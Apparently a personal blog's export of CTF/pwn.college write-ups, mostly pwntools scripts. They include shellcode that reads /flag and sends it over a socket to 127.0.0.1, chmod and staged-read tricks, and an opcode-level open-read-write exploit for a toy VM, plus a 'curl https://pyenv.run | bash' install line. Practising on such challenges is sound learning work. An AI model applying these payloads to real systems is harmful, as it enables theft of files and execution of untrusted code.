gdb.debug(&#x27;./level9_chall_cp&#x27;,&#x27;b *main\nb *main + 912&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./level10_chall&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-11"><a class="markdownIt-Anchor" href="#level-11">#</a> level 11</h3>
<p>用的 socket，和上题一样但是长很多所以调整更多</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.syntax = &#x27;intel&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line">flag_file = <span class="string">&#x27;/flag&#x27;</span></span><br><span class="line">flag_file = flag_file[::-<span class="number">1</span>]</span><br><span class="line">flag_file = flag_file.encode().<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(flag_file)</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">// socket:</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov dil, 2</span></span><br><span class="line"><span class="string">    mov sil, 1</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov al, 41</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov r9, rax</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">//  socket addr preparation</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    sub rsp, 4</span></span><br><span class="line"><span class="string">    mov word ptr [rsp + 0], 2</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov word ptr [rsp + 2], 0x2e16</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov word ptr [rsp + 4], 0x007f</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    mov word ptr [rsp + 6], 0x0100</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//  connect</span></span><br><span class="line"><span class="string">    mov dl, 16</span></span><br><span class="line"><span class="string">    mov al, 42</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    xchg ecx, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rcx, rdi</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    xchg ecx, eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// open:</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    sub rsp, 5</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    xchg eax, ecx</span></span><br><span class="line"><span class="string">    xchg eax, edx</span></span><br><span class="line"><span class="string">    xchg eax, edx</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp], 0x2f</span></span><br><span class="line"><span class="string">    xchg eax, edx</span></span><br><span class="line"><span class="string">    xchg eax, edx</span></span><br><span class="line"><span class="string">    xchg eax, edx</span></span><br><span class="line"><span class="string">    xchg eax, edx</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+1], 0x66</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xchg eax, ebx</span></span><br><span class="line"><span class="string">    xchg eax, ebx</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+2], 0x6c</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xchg eax, ebx</span></span><br><span class="line"><span class="string">    xchg eax, ebx</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+3], 0x61</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xchg eax, ebp</span></span><br><span class="line"><span class="string">    xchg eax, ebp</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+4], 0x67</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xchg eax, ebp</span></span><br><span class="line"><span class="string">    xchg eax, ebp</span></span><br><span class="line"><span class="string">    mov byte ptr [rsp+5], 0x00</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xchg eax, esi</span></span><br><span class="line"><span class="string">    xchg eax, esi</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    xchg eax, edi</span></span><br><span class="line"><span class="string">    xchg eax, edi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read:</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    xchg eax, edi</span></span><br><span class="line"><span class="string">    xchg eax, edi</span></span><br><span class="line"><span class="string">    mov dl, 0x50</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    xchg eax, edi</span></span><br><span class="line"><span class="string">    xchg eax, edi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// write:</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    test eax, eax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rdi, r9</span></span><br><span class="line"><span class="string">    test eax, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov al, 0</span></span><br><span class="line"><span class="string">    inc rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    inc rax</span></span><br><span class="line"><span class="string">    mov al, 3</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    inc rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">hex_shellcode = asm(shellcode)</span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./level9_chall_cp&#x27;,&#x27;b *main\nb *main + 912&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./level10_chall&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,hex_shellcode + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># p.send(hex_shellcode + b&#x27;\n&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-12"><a class="markdownIt-Anchor" href="#level-12">#</a> level 12</h3>
<p>不能重复，这里就用 chmod 那个打法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov al, 0x5a</span></span><br><span class="line"><span class="string">    mov sil, 7</span></span><br><span class="line"><span class="string">    push 0x66     </span></span><br><span class="line"><span class="string">    // f</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyshell_level13&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level-13"><a class="markdownIt-Anchor" href="#level-13">#</a> level 13</h3>
<p>前面的 exp 可以打通，这里不是很理解为什么没有 write 还可以 push 和 pop</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov al, 0x5a</span></span><br><span class="line"><span class="string">    mov sil, 7</span></span><br><span class="line"><span class="string">    push 0x66     </span></span><br><span class="line"><span class="string">    // f</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/babyshell_level13&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x1000 bytes from stdin.\n&#x27;</span>,asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># 即使栈没有写权限，还是可以push和pop</span></span><br></pre></td></tr></table></figure>
<h3 id="level-14"><a class="markdownIt-Anchor" href="#level-14">#</a> level 14</h3>
<p>6 字节，这里只能 read，调试利用已有的寄存器， <code>fd = 1</code>  即可接着写入 shellcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>],log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  xor edi, edi</span></span><br><span class="line"><span class="string">    mov esi, edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;/challenge/babyshell_level14&#x27;)</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;/challenge/babyshell_level14&#x27;,&#x27;b *main + 634&#x27;)</span></span><br><span class="line">p = gdb.debug(<span class="string">&#x27;./level14_chall&#x27;</span>,<span class="string">&#x27;b* main + 674&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Reading 0x6 bytes from stdin.\n&#x27;</span>,asm(shellcode))</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">//  open</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    nop</span></span><br><span class="line"><span class="string">    mov rbx, 0x0067616c662f</span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov al, 2</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// read</span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x50</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// write</span></span><br><span class="line"><span class="string">    mov rdi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, rax</span></span><br><span class="line"><span class="string">    mov rax, 1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>ubuntu python version manage</title>
    <url>/2024/01/31/ubuntu-python-version-manage/</url>
    <content><![CDATA[<span id="more"></span>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev \</span><br><span class="line">libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \</span><br><span class="line">libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl https://pyenv.run | bash</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>vnctf2023</title>
    <url>/2023/02/27/vnctf2023/</url>
    <content><![CDATA[<h3 id="vnctf2023-re"><a class="markdownIt-Anchor" href="#vnctf2023-re">#</a> vnctf2023 re</h3>
<ul>
<li><a href="#1.1">BabyAnti</a></li>
</ul>
<span id="more"></span>
<h4 id="div-id11babyantidiv"><a class="markdownIt-Anchor" href="#div-id11babyantidiv">#</a> <div id="1.1">BabyAnti<div></div></div></h4>
<h5 id="an-android-reverse-problem-the-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-ce-to-pass-the-game"><a class="markdownIt-Anchor" href="#an-android-reverse-problem-the-official-solution-is-to-patch-and-bypass-the-anticheat-module-and-use-ce-to-pass-the-game">#</a> An android reverse problem. The official solution is to patch and bypass the anticheat module and use CE to pass the game.</h5>
<h5 id="unpacked-the-apk-and-check-it-in-the-ida-when-the-dynamic-library-been-loaded-it-shall-call-the-function-jni_onload-we-can-see-four-function-after-it"><a class="markdownIt-Anchor" href="#unpacked-the-apk-and-check-it-in-the-ida-when-the-dynamic-library-been-loaded-it-shall-call-the-function-jni_onload-we-can-see-four-function-after-it">#</a> Unpacked the apk and check it in the ida. When the dynamic library been loaded, it shall call the function JNI_OnLoad. We can see four function after it.</h5>
<p><code>ret of four func, to be continue</code></p>
<h5 id="a-anticheat-class-in-smali-pack"><a class="markdownIt-Anchor" href="#a-anticheat-class-in-smali-pack">#</a> A antiCheat class in Smali pack</h5>
<p><code>to be continue</code></p>
]]></content>
  </entry>
  <entry>
    <title>vm初探</title>
    <url>/2024/04/08/vm%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface最后两个逆向题其实更像pwn的入门vm写个orw最后一题需要用各种方法bruteforce-leak-opcode由于附件不同这里exp相当于一个思路"><a class="markdownIt-Anchor" href="#preface最后两个逆向题其实更像pwn的入门vm写个orw最后一题需要用各种方法bruteforce-leak-opcode由于附件不同这里exp相当于一个思路">#</a> PREFACE：最后两个逆向题，其实更像 pwn 的入门 vm，写个 orw，最后一题需要用各种方法 bruteforce &amp; leak opcode（由于附件不同这里 exp 相当于一个思路）</h6>
<span id="more"></span>
<h5 id="直白的orw"><a class="markdownIt-Anchor" href="#直白的orw">#</a> 直白的 orw</h5>
<p>21.1</p>
<p>（ps. 后面看这里有点问题的，偏移其实不对，但是可以通，很奇妙，可能是有什么奇妙巧合？）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./babyrev_level21.0&#x27;,&#x27;b *interpret_sys + 156\nb *interpret_sys + 491\nb *interpret_sys + 659&#x27;)</span></span><br><span class="line">p = process([<span class="string">&#x27;strace&#x27;</span>,<span class="string">&#x27;./babyrev_level21.1&#x27;</span>])</span><br><span class="line"><span class="comment"># p = process(&#x27;./babyrev_level21.1&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">match</span> name:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;opcode[1024]&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">64</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;opcode[1025]&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;opcode[1026]&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">16</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;opcode[1027]&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;opcode[1028]&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;opcode[1029]&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">32</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;err register&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_instruction</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">match</span> name:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_imm&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x200</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_add&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x400</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_stk&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x800</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_stm&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x100</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_ldm&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x1000</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_cmp&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x8000</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_jmp&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x2000</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;interpret_sys&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x4000</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;err instruction&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_imm</span>(<span class="params">regs,value</span>):</span><br><span class="line">    <span class="keyword">return</span> interpret_instruction(<span class="string">&#x27;interpret_imm&#x27;</span>) + register(regs) + (value &lt;&lt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_stm</span>():</span><br><span class="line">    <span class="comment"># opcode[1025] = offset</span></span><br><span class="line">    <span class="comment"># opcode[1026] = value</span></span><br><span class="line">    <span class="keyword">return</span> interpret_instruction(<span class="string">&#x27;interpret_stm&#x27;</span>) + (register(<span class="string">&#x27;opcode[1025]&#x27;</span>)) + (register(<span class="string">&#x27;opcode[1026]&#x27;</span>) &lt;&lt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interpret_sys</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">match</span> name:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;open&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x20</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;read_code&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x4</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;read&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x8</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x2</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;sleep&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x10</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0x1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;err sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open</span>():</span><br><span class="line">    <span class="comment"># opcode[opcode[1024] + 768] = addr</span></span><br><span class="line">    <span class="comment"># opcode[1024] = fd</span></span><br><span class="line">    <span class="comment"># opcode[1026] = len</span></span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;open&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>) + (register(<span class="string">&#x27;opcode[1024]&#x27;</span>) &lt;&lt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="comment"># opcode[1024] = fd</span></span><br><span class="line">    <span class="comment"># opcode[1025] = ret len</span></span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;read&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>) + (register(<span class="string">&#x27;opcode[1025]&#x27;</span>) &lt;&lt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="comment"># opcode[1024] = fd</span></span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;write&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>) + (register(<span class="string">&#x27;opcode[1025]&#x27;</span>) &lt;&lt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitPro</span>():</span><br><span class="line">    <span class="keyword">return</span> interpret_sys(<span class="string">&#x27;exit&#x27;</span>) + interpret_instruction(<span class="string">&#x27;interpret_sys&#x27;</span>)</span><br><span class="line"></span><br><span class="line">opcode_func = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,768) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;/&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,769) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;f&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,770) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;l&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,771) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;a&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,772) # offset</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,ord(&#x27;g&#x27;)) # value</span></span><br><span class="line"><span class="string">interpret_stm()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1024]&#x27;,0) # addr = opcode[0 + 768]</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,0)</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,0)</span></span><br><span class="line"><span class="string">open()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,0x50) # len</span></span><br><span class="line"><span class="string">read()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1024]&#x27;,1)</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1025]&#x27;,0)</span></span><br><span class="line"><span class="string">interpret_imm(&#x27;opcode[1026]&#x27;,0x50) # len</span></span><br><span class="line"><span class="string">write()</span></span><br><span class="line"><span class="string">exitPro()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">opcode = []</span><br><span class="line">opcode_func = opcode_func.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># print(opcode_func)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opcode_func:</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    p48 = <span class="built_in">eval</span>(i)</span><br><span class="line">    opcode.append(p48 &amp; <span class="number">0xff</span>)</span><br><span class="line">    opcode.append((p48 &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    opcode.append((p48 &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">opcode+=([<span class="number">0</span>] * (<span class="number">0x300</span> - <span class="built_in">len</span>(opcode)))</span><br><span class="line"></span><br><span class="line">a = opcode</span><br><span class="line">a = <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([i]) <span class="keyword">for</span> i <span class="keyword">in</span> a])</span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line">p.send(a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h5 id="随机化opcode的orw"><a class="markdownIt-Anchor" href="#随机化opcode的orw">#</a> 随机化 opcode 的 orw</h5>
<p>22.0</p>
<p>爆破的思路：</p>
<p>种子一共 0xff 个，没有尝试直接爆，徒手一步一步做的（注释掉的就是思路），从 exit 为入口点一步一步推一步一步还原（这里最后的 open 只有三个可能的值 <code>1|8|64</code> ，直接手试了）:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./babyrev_level21.0&#x27;,&#x27;b *interpret_sys + 156\nb *interpret_sys + 491\nb *interpret_sys + 659&#x27;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;strace&#x27;,&#x27;./babyrev_level22.0&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------</span></span><br><span class="line"><span class="comment">### sys:16  | exit:1</span></span><br><span class="line"><span class="comment">### interpret_imm:4 | opcode[1024]:8</span></span><br><span class="line"><span class="comment">### sleep:128</span></span><br><span class="line"><span class="comment">### read_code|read_memory:2/32                 opcode[1029]:64   